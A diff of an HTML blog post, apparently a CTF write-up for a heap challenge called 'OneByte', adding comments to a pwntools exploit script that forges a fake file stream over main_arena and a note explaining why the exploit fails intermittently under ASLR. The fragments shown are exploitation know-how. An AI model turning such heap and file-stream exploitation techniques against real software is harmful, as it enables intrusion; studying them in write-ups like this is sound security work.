@@ -120,7 +120,7 @@ OneByte | 0x3nigma
             
             
                 <dt>reading time</dt>
-                <dd>15 minutes</dd>
+                <dd>16 minutes</dd>
             
         </dl>
     </section>
@@ -352,6 +352,8 @@ the 4th least significant bit is normally set to 0 due to 16 byte alignment. Dur
 </span></span><span style="display:flex;"><span>edit(chunk_F, fakef)
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># Fake chunk G part</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Setting the _mode field to 0x0 to pass buffer flushing checks.</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Required _mode field value is &lt;= 0x0.</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>edit(chunk_G, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x10</span>)
 </span></span><span style="display:flex;"><span>edit(chunk_G, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x10</span>)
@@ -484,6 +486,8 @@ the 4th least significant bit is normally set to 0 due to 16 byte alignment. Dur
 </span></span><span style="display:flex;"><span>edit(chunk_F, fakef)
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># Fake chunk G part</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Setting the _mode field to 0x0 to pass buffer flushing checks</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Required _mode field value is &lt;= 0x0.</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>edit(chunk_G, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x10</span>)
 </span></span><span style="display:flex;"><span>edit(chunk_G, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x10</span>)
@@ -498,7 +502,9 @@ the 4th least significant bit is normally set to 0 due to 16 byte alignment. Dur
 </span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>send(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;5&#34;</span>)
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>interactive()
-</span></span></code></pre></div>
+</span></span></code></pre></div><h3 id="note">Note:</h3>
+<p>Our exploit is not 100% reliable. This is because of the reason how the <code>_mode</code> field of the fake filestream that overlaps the <code>main_arena</code> is formed. <code>_mode</code> is a 32 bit field and is formed by overlapping the least significant bytes of the 0xc0 smallbin.This results in its most significant bit that determines whether it&rsquo;s interpreted as positive or negative value or not is subject to ASLR. As a result sometimes if the <code>_mode</code> field is positive the fake file stream overlapping the main arena may pass the second buffer flushing check, leading to calling a corrupted <code>__overflow</code> entry leading to segfault.</p>
+
     </div>
 </div>
 
